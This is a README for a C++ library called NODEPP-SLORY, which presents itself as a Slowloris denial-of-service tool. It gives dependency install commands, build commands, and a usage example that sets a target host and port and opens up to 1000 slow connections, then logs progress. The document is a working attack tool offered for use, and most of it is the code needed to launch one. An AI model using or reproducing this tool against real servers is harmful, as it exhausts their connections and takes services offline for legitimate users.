# NODEPP-SLORY

A DDoN Service Slowloris algorithm using Nodepp.

## Dependencies

- **Openssl**
    - 🪟: `pacman -S mingw-w64-ucrt-x86_64-openssl`
    - 🐧: `sudo apt install libssl-dev`

# Usage

```cpp
#include <nodepp/nodepp.h>
#include <slory.h>

using namespace nodepp;

void onMain(){

    slory_config_t args;
    args.host     = "localhost";
    args.IPPROTO  = IPPROTO_TCP;
    args.timeout  = 10000;
    args.maxconn  = 1000;
    args.port     = 8000;

    auto slory = slory::tcp( args );
    console::log("slowlory started");

    slory.onProgress([=]( uint a, uint b ){
        console::log( "->", a, b );
    });

}
```

# Build & Run

- 🪟: `g++ -o main main.cpp -I ./include -lssl -lcrypto -lws2_32 ; ./main`
- 🐧: `g++ -o main main.cpp -I ./include -lssl -lcrypto ; ./main`
